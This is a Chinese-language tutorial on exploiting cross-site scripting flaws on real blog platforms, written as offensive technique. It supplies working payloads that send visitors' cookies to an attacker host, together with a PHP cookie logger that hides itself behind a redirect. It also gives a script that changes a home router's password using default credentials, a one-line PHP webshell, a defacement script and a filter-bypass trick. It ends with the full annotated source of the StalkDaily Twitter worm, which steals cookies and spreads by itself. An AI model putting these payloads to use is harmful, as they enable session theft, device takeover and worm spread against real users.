
# 跨站脚本攻击实例解析

> 原文：[`www.pediy.com/kssd/pediy12/124209.html`](https://www.pediy.com/kssd/pediy12/124209.html)

作者：泉哥

主页：[`riusksk.blogbus.com`](http://riusksk.blogbus.com)

## 前言

跨站攻击，即 Cross Site Script Execution(通常简写为 XSS，因为 CSS 与层叠样式表同名，故改为 XSS) 指是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的 HTML 代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。很多人对于 XSS 的利用大多停留在弹框框的程度，一些厂商对 XSS 也是不以为然，都认为安全级别很低，甚至忽略不计。本文旨在讲述关于跨站攻击的利用方式，并结合实例进行分析。

## 漏洞测试

关于对 XSS 的漏洞测试，这里就以博客大巴为例进行测试，最近我也在上面发现了多处跨站漏洞，其中两处已公布在 WooYun 网站上，其主要内容如下：

代码:
```cpp
漏洞详情
简要描述：
博客大巴存储型 XSS 漏洞
详细说明：
在“个人信息设置”的“附加信息”一项中，由于对“个人简介”的内容过滤不严，导致可在博客首页实现跨站，而在下方“添加一段附加信息”中，由于对“信息标题”内容过滤不严，同样可导致跨站的出现。
```

但我刚又测试了一下，发现官方只修补了其中一个漏洞（个人简介），而另一个漏洞得在博客管理后台才能触发，利用价值不大。与此同时我在对博客模板的测试中，又发现了五处跨站漏洞，估计这些漏洞其实很早就有人发现了，只是没人公布或者报给 blogbus 后仍未修补。这次报给 WooYun 的主要目的是让 blogbus 修补此漏洞，因为我的博客就在上面！^_^ 其余五处漏洞分别在“编辑自定义模板”中，由于对代码模块 `head,index,index-post,detail,detail-post` 等处的代码过滤不严，导致跨站的发生，分别向其写入`<img src="#" onerror=alert("head")></img>`，为便于区别，我将提示语句更改为对应的名称，前三项在首页可触发脚本，后两项需打开文章才可触发，测试结果如图 1、2 所示：

![](img/0fba09d25814c7f243cd6f1db46090d9.jpg)

图 1（在首页触发）

![](img/c8ea1a7f0215c6cfff8cb5533e850ff8.jpg)

图 2（打开文章触发）

对于其它网站的测试基本也是大同小异，除了手工测试外，你还可使用其它一些自动扫描工具，比如 `Acunetix Web Scanner`……

## 漏洞利用

### 一、窃取 Cookie

对于跨站的攻击方法，使用最多的莫过于 cookie 窃取了，获取 cookie 后直接借助“明小子”工具或其它可修改 cookie 的浏览器（如装有 `Cookies Edit` 插件的 Firefox）将 cookie 修改为获取的 cookie，这样即可获得博客的管理权限。

首先，我们在自定义模板的 `head` 代码模块中写入

`<script>document.write('<img src="http://localhost/test.php?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>`

或者

`<script>document.location = 'http://localhost/test.php?cookie=' + document.cookie;</script>`

这里我把脚本放在本机上，你可以根据脚本地址来更改上面的 `localhost` 地址。以上两个均可达到同等效果，但就隐蔽性而言，前者的隐蔽性会更强些，读者可自行选择，当然也有其它语句可达到一样的目的，就看你如何发挥了。接下来我们来编写上面的 `test.php` 文件，它主要用于获取对方的 cookie，其源代码如下：

代码:
```cpp
<?php

$cookie = $_GET['cookie'];            //以 GET 方式获取 cookie 变量值
$ip = getenv ('REMOTE_ADDR');        //远程主机 IP 地址
$time=date('Y-m-d g:i:s');            //以“年-月-日 时：分：秒”的格式显示时间
$referer=getenv ('HTTP_REFERER');    //链接来源
$agent = $_SERVER['HTTP_USER_AGENT'];    //用户浏览器类型

$fp = fopen('cookie.txt', 'a');        //打开 cookie.txt，若不存在则创建它
fwrite($fp," IP: " .$ip. "\n Date and Time: " .$time. "\n User Agent:".$agent."\n Referer: ".$referer."\n Cookie: ".$cookie."\n\n\n");    //写入文件
fclose($fp);    //关闭文件

header("Location: http://www.baidu.com");    //将网页重定向到百度，增强隐蔽性

?>
```

接下来我们访问博客首页，我这里以 `http://quan-ge.blogbus.com` 为测试地址，访问后我们打开 `http://localhost/cookie.txt` 看看 `cookie.txt` 文件是否被创建并写入数据，结果如图 3 所示：

![](img/b48818ca31a7d51b3a397097fafaa8ef.jpg)

图 3

很明显，我们已经成功窃取到 cookie 了，剩下的事相信大家都知道，这里就不再赘述。

### 二．渗透路由器

对于处于内网中的用户，我们可以利用 XSS 来更改路由器密码。我们可以借助默认的密码来登陆路由器，比如 URL：`http://admin:admin@192.168.1.1`，其实很多路由器都是使用默认密码，我这里这台也是如此，直接以 `admin` 作为用户名和密码。首先我们先利用 Firefox 插件 `Live HTTP headers` 获取请求头，如图 4 所示：

![](img/420b1d4cf3f6cbe218872eecb71f394b.jpg)

图 4

因此我们可以在 `head` 代码模块中写入以下语句：

`<script src="http://localhost/1.js"></script>`

其中 `1.js` 源码如下：

`window.open("http://admin:admin@192.168.1.1/userRpm/ChangeLoginPwdRpm.htm?oldname=admin&oldpassword=admin&newname=administrator&newpassword=password&newpassword2=password&Save=%B1%A3+%B4%E6");`

下面我们试着用 `http://newadmin:newpass@192.168.1.1` 登陆，结果如图 5 所示：

![](img/72ce7367951ac92017607b1f254e08ad.jpg)

图 5

可见密码已经修改成功！

### 三、读取本地文件

在不同的浏览器中对本地文件的读取有着不同的限制，之前 `XEYE team` 曾有过统计，具体内容如下：

1: IE6 可读取无限制本地文件.ie8 以及相应版本的 trident 内核浏览器对 ajax 本地执行时的权限控制得很死的，看来 MS 对 IE 这类安全风险比较重视。

2: FF3.0.8 及以下版本允许本地执行的 ajax 访问当前目录下的文件内容。其他目录暂无法访问。

3: opera9.64 及以下版本允许通过指定 url 为 `file://` 协议进行访问；如果文件在当前目录下，则不需要指定 `file://` 协议；如果文件在同一盘符下甚至可以超越目录的方式访问:`../../boot.ini`。

4: 基于 webkit 内核：`google chrome`、`遨游 3.0`、`safari` 等浏览器对本地执行的 ajax 权限没做任何访问限制.

以上测试是利用 ajax 来读取文件的。但是我在 windows7 平台上用 php 测试各个最新版浏览器时发现：

1、 Firefox 3.6.10、搜狗浏览器 2.2.0.1423、Maxthon 2.5.14、IE8、Chrome 7.0.513.0、360 浏览器 3.5、世界之窗 3.2、TT 浏览器 4.8 均可跨目录读取本地文件。

2、 Opera 10.70 不允许读取本地文件，若是读取本地文件会直接给出警告，但你仍可选择继续读取。

我测试用的 PHP 脚本（该脚本位于 `D:\riusksk\Webroot\reader.php`）代码如下：

代码:
```cpp
<?php
$handle = fopen("file://c:\sysiclog.txt", "rb") or die("can't open file");
$contents = '';
while (!feof($handle)) {
    $contents .= fread($handle, 1024);
}
$contents=urldecode($contents);
echo $contents;
//$fp = fopen('info.txt', 'a');       
//fwrite($fp,$contents);   
//fclose($fp);   
fclose($handle);
?>
```

在存在 XSS 的地方嵌入上面 php 文件，方法与 cookie 劫持一样。由于现在 blogbus 打不开，可能又是服务器搬迁。这里我以 blogcn.com 上的漏洞为例进行测试， Firefox 下的情况如图 6 所示：

![](img/d69bdd462d460240b077355689466e04.jpg)

图 6

谷歌浏览器 Chrome 情况如图 7 所示：

![](img/867b72d24b93e6ecf385cd7620b92745.jpg)

图 7

搜狗浏览器下的情况如图 8 所示：

![](img/24cb57cd325304dedf8e95d9de375396.jpg)

图 8

傲游浏览器下的情况：

![](img/f795a308f3eff19a3cf4848e1f407520.jpg)

图 9

IE8 下的情况如图 10 所示：

![](img/f671f07ccc43044b9c953baed3b37b0a.jpg)

图 10

360 安全浏览器情况如图 11 所示：

![](img/6b1c4f1a25b02b4db0e096ad9a46e457.jpg)

图 11

世界之窗情况如图 12 所示：

![](img/96eadd7830385335ae57840db4dc26a8.jpg)

图 12

TT 浏览器情况如图 13 所示：

![](img/f322de6a6becc8454cb716b3972f4eab.jpg)

图 13

Opera 下直接给出警告如图 14 所示：

![](img/e4a455c05a6aa7c8ef316a4253e9be3e.jpg)

图 14

当然，这些漏洞除了读取文件外，还可写入一句话木马`<?php eval($_POST[cmd])?>`，为进一步提权提供条件。

### 四、Hacking HomePage

相信对于很多初学 Hack 的朋友，都会对那一张张的黑页独有情钟，尤其是当前中美黑客大战中，中国人挂在白宫网站上黑页，让人至今记忆犹新！本节主要就是利用 XSS 来黑掉别人博客主页，但这里的黑页与入侵服务器来修改主页有很大区别，利用 XSS 来黑页其实并不是修改服务器上的页面，它只是通过 JavaScript,CSS 及其它 WEB 技术来修改页面。这主要就是通过注入 js 代码，然后在后台执行以达到盗取 cookie 或劫持浏览器的目的，这些代码往往都是一些 HTML 或 JavaScript 代码(往往是使用 `InnerHTML` 或者 `document.write` 命令来动态创建文本，图像及其它数据信息)。在本文编写过程中，我又发现了博客大巴上的几处跨站漏洞，就在“博客设置”中，这里我们就以其中“基础设置”下的“自定义 header”一栏为例。我们先在向其写入下列语句：

`<script src ="http://localhost/1.js"></script>`

接下来编写 `1.js` 代码：

`document.write("<center><h1><font color=#FF0000>Hacked By riusksk</font></h1></cneter>");`

`document.write("<center><h2><font color=#000000>Just for test !</font><h2></center><p><img src=http://filer.blogbus.com/6233861/resource_6233861_1283677044i.jpg></p><p><!--");`

上面的“`<!`”主要是用于将后面的页面内容注释掉，避免显示，但这在各浏览器中情况会有所不同，比如我在 Chrome 中可以起到此作用，但在其它浏览器达不到此效果了，得采用其它注释语句方可，或者先用 `document.body.innerHTML = '';`来清空 body 主体中的 html 代码，然后再逐一利用 `document.createElement` 创建元素也是可行的。这里我是以 Chrome 作为测试用的浏览器，访问博客首页后结果如图 15 所示：

![](img/3de1a1a3153c22f266d1c29823f4a2b3.jpg)

图 15

成功“黑掉”博客主页！

### 五、跨站中的“溢出攻击”

相信熟悉缓冲区溢出攻击的朋友，都知道其中的原理：通过向堆栈中填充过多的字节以覆盖返回地址，进而控制程序的执行流程。这里我要讲的 XSS 攻击方式与溢出有着类似的特点，在此我们以“中国博客网（blogcn.com）”为实例进行讲解。经过本人的多次测试，发现上面有着不少 XSS 漏洞，后来听从乱雪同志的建议，将阵地转移到 blogbus，但正如上面所讲到的，结果还是漏洞一堆，看来很多技术人员把博客放在百度空间还是有一定道理，至少它比这些博客网站安全多了。现在回归正传，本节就以发表日志中存在的跨站漏洞为例。我们先像往常一样在日志中输入`<script>alert(“riusksk”)</script>`，发表后再查看日志时并未触发脚本，因为其中的“`<`”、“`>`”均被过滤掉了，如图 16 所示：

![](img/1b2f6e1a4f805627a9643983c3e6378f.jpg)

图 16

通常`<>`被过滤掉，xss 基本没多大希望了，很多人都会放弃掉了。但是经过本人多次的测试，发现当博客的内容显示方式被设置为“摘要”的时候，也就是如图 17 所示的情况：

![](img/a828b0305a4036631d52dcd40e8ece0a.jpg)

图 17

在这种情况下，博客首页上面显示的文章均会只显示博文的前几行而已，如果此时我们的 XSS 语句刚好到达这个省略点时，那么它就会因被省略掉而未对其进行过滤，进而触发漏洞。当 XSS 语句刚好处于这个省略点时，它并未在页面中显示，但仍包含于网页之中。这个省略点就像溢出攻击的“溢出点（返回地址）”一样，通过填充数据到这个点即可触发漏洞。经过测试发现，当 XSS 语句处于第五行时就可触发漏洞。或者放在第三或四行，接着再在 XSS 语句后面写几行其它内容，同样也可达到执行脚本的目的。因此这里我们可以在日志中构造如下语句：

AAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAA

`<script>alert("riusksk")</script>`

其中每行‘A’的个数不限，只要能凑足一行就行了，或者用其它数据填充也是一样的。我们在首页中试着看看效果：

![](img/6d87cf302c5da744f442879db9c4743d.jpg)

图 18

正如图 18 所示，我们已经成功跨站了！再看下此时的源码情况，如图 19 所示：



![](img/187f73af064527f28815243f199f8438.jpg)

图 19

很显然，处于省略点的 XSS 语句并没有经过过滤，这样我们就绕过了它的字符过滤保护！但是如果我们打开这篇博文并不能实现跨站，只有 XSS 语句处于省略部分时才可达到以上效果。Blogcn 上面还有许多处 XSS 漏洞，但感觉这处的利用方法比较有趣，就提出来与大家分享。虽然这并不是真正意义上的溢出攻击，但如果你嵌入的真正用于溢出某 ActiveX 控件的代码，比如使用 `heap spray` 技术等等，还有之前出现的 IE `iframe` 溢出漏洞，利用这些漏洞也是可以实现真正意义上的溢出攻击的。

## 六、XSS Worm

随着 WEB2.0 时代的到来，而 Ajax 就是 WEB2.0 的标志性技术。AJAX 即 “Asynchronous JavaScript and XML”（异步 JavaScript 和 XML)，AJAX 并非缩写词，而是由 Jesse James Gaiiett 创造的名词，是指一种创建交互式网页应用的网页开发技术。Ajax 的出现为 XSS 蠕虫的发展提供的很大的便利，也因此加速了 `xss worm` 技术的传播。这里我们就以之前爆发的 Twitte 蠕虫为例进行分析，这个 XSS worm 之前在我的博客上也有提到（）。该跨站漏洞主要出现在 "Settings" 菜单下的 "Name" 文本域以及 "More info URL" 文本域，是由一位来自美国纽约的 17 岁小伙子写的，当时他花了 2 小时就全搞定了。其源码分析如下：

代码:

```cpp
function XHConn()
{
  //创建 XMLHttpRequest 对象
  var xmlhttp, bComplete = false;
  //由于 Internet Explorer 浏览器使用 MSXML 解析器处理 XML，而且 MSXML 实际上有两种不同的版本，因此采用以下两种方式创建对象
  try { xmlhttp = new ActiveXObject("Msxml2.XMLHTTP"); }         
  catch (e) { try { xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); }
  //下面是针对非 IE 浏览器（包括 Mozilla、Firefox、Safari、Opera……）来创建 XMLHttpRequest 对象
  catch (e) { try { xmlhttp = new XMLHttpRequest(); }
  catch (e) { xmlhttp = false; }}}
  if (!xmlhttp) return null;    //若 XMLHttpRequest 对象创建失败则返回 NULL
  this.connect = function(sURL, sMethod, sVars, fnDone) //创建连接回调函数
  {
    if (!xmlhttp) return false;
    bComplete = false;
    sMethod = sMethod.toUpperCase();    //将发送方式转换为大写字母，即 GET 或 POST
    try {
      if (sMethod == "GET")
      {
        xmlhttp.open(sMethod, sURL+"?"+sVars, true);    //以异步连接的方式配置 GET 请求
        sVars = "";
      }
      else
      {
        xmlhttp.open(sMethod, sURL, true);
                //配置请求头数据
        xmlhttp.setRequestHeader("Method", "POST "+sURL+" HTTP/1.1");
        xmlhttp.setRequestHeader("Content-Type",
          "application/x-www-form-urlencoded");
      }
          //设置每次请求的就绪状态发生变化时调用的回调函数
      xmlhttp.onreadystatechange = function(){
        if (xmlhttp.readyState == 4 && !bComplete)      //当响应已完成
        {
          bComplete = true;
          fnDone(xmlhttp);      //当服务器响应时就会调用回调函数 fnDone(),不过这里没有给出此函数
        }};
      xmlhttp.send(sVars);      //发送请求
    }
    catch(z) { return false; }
    return true;
  };
  return this;
}

function urlencode( str ) {
    var histogram = {}, tmp_arr = [];
    var ret = str.toString(); //返回字符串

    var replacer = function(search, replace, str) {
        var tmp_arr = [];
        tmp_arr = str.split(search);    //从 search 指定的参数将 str 分割成字符串数组
        return tmp_arr.join(replace);   //把数组 tmp_arr[]中的所有元素通过 replace 指定的分隔符进行连接，以组成一个字符串
    };
    //对下列字符进行 URL 编码转换
    histogram["'"] = '%27';
    histogram['('] = '%28';
    histogram[')'] = '%29';
    histogram['*'] = '%2A';
    histogram['~'] = '%7E';
    histogram['!'] = '%21';
    histogram['%20'] = '+';

    ret = encodeURIComponent(ret);

    for (search in histogram) {
        replace = histogram[search];
        ret = replacer(search, replace, ret)
    }
        //将%[a-z0-9]这样格式的字符转换为大写字母
    return ret.replace(/(\%([a-z0-9]{2}))/g, function(full, m1, m2) {
        return "%"+m2.toUpperCase();
    });

    return ret;
}

var content = document.documentElement.innerHTML;       //当前浏览器中的 HTML 内容
userreg = new RegExp(/<meta content="(.*)" name="session-user-screen_name"/g);  //利用正则表达式进行全局匹配查找当前登陆的用户名
var username = userreg.exec(content);
username = username[1];

var cookie;
cookie = urlencode(document.cookie);    //获取当前 cookie 并进行 URL 编码
document.write("<img src='http://mikeyylolz.uuuq.com/x.php?c=" + cookie + "&username=" + username + "'>");      //窃取 cookie
document.write("<img src='http://stalkdaily.com/log.gif'>");

function wait()
{
        var content = document.documentElement.innerHTML;
        //利用正则表达式进行全局匹配查找表单变量 form_authenticity_token 的值，它是一个随机数，可用于阻止 CSRF 攻击，在发送请求时必须加入此变量值
        authreg = new RegExp(/twttr.form_authenticity_token = '(.*)';/g);       
        var authtoken = authreg.exec(content);
        authtoken = authtoken[1];
        //alert(authtoken);

        //设置一些随机信息用于发送
        var randomUpdate=new Array();
        randomUpdate[0]="Dude, www.StalkDaily.com is awesome. What's the fuss?";
        randomUpdate[1]="Join www.StalkDaily.com everyone!";
        randomUpdate[2]="Woooo, www.StalkDaily.com :)";
        randomUpdate[3]="Virus!? What? www.StalkDaily.com is legit!";
        randomUpdate[4]="Wow...www.StalkDaily.com";
        randomUpdate[5]="@twitter www.StalkDaily.com";

        var genRand = randomUpdate[Math.floor(Math.random()*randomUpdate.length)];

        updateEncode = urlencode(genRand);

        var xss = urlencode('http://www.stalkdaily.com"></a><script src="http://mikeyylolz.uuuq.com/x.js"></script><a ');

        var ajaxConn = new XHConn();    //创建 XMLHttpRequest 对象
        //下列代码用于发送虚假的 twitte 信息
        ajaxConn.connect("/status/update", "POST", "authenticity_token="+authtoken+"&status="+updateEncode+"&tab=home&update=update");   
        var ajaxConn1 = new XHConn();
        //修改设置，以插入恶意脚本进行传播
        ajaxConn1.connect("/account/settings", "POST", "authenticity_token="+authtoken+"&user[url]="+xss+"&tab=home&update=update");
}
setTimeout("wait()",3250);      //每 3 秒左右就调用 wait()函数
```

偶而写写无害病毒，对于提高编程水平还是有一定帮助的，而且还能引起各网站对安全方面的重视，进而提高网站的安全性，也算是为安全行业做点贡献。至于那些具有攻击性的病毒还是少写为妙，不然法律的制裁是免不的，特别是最近几年，关于信息安全方面的法律也已经逐步完善了。

## 结论

跨站脚本攻击的方式主要还是依靠利用者的 `javascript` 编程水平，你的编程水平够高，就能玩出更高级的花样出来。本文这里讲述的也只是冰山一角，还有其它 `Attack API`，`XSS shell`，读取浏览器密码，攻击 Firefox 插件……其它更多的方法还有待大家去挖掘和利用，如果你有其它更好、更有趣的攻击方式，希望可以共同分享一下。
